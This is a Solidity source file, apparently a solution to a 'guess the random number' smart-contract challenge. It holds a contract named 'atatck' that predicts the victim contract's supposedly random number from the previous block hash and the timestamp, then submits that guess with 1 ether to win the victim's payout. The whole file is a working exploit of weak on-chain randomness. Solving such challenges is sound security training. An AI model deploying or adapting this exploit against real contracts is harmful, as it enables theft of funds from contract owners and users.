pragma solidity ^0.6.0;

import "./victim.sol";

contract atatck{
    GuessTheRandomNumberChallenge victim;

    constructor(GuessTheRandomNumberChallenge _victimContractAddr) public{
        victim = GuessTheRandomNumberChallenge(_victimContractAddr);
    }
    fallback() external payable{}

    function attack() public payable{
        uint guess = uint(keccak256(abi.encodePacked(blockhash(block.number - 1), now)));
        victim.GuessTheRandomNumber{value : 1 ether}(guess);
    }

}